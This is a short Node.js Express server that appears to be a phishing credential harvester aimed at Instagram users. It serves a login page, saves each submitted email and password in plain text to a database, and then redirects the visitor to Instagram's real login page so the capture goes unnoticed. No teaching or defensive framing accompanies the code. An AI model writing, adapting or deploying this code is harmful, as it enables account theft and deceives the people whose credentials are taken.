const express = require('express')
const { User } = require('./models');
const { PORT = 3000 } = process.env;
const app = express();


app.set('view engine', 'ejs');
app.use(express.static("public"));

app.use(express.urlencoded({extended:true}))
app.use(express.json());

app.get('/', (req,res) => {
    res.status(200).render("login");
})

app.post('/', async(req,res) => {
    const {email, password} =req.body;
    await User.create({
        email, password
    })
    res.redirect(`https://www.instagram.com/accounts/login/`)
})
app.listen(PORT, ()=> console.log(`Listening on port http://localhost:${PORT}`));
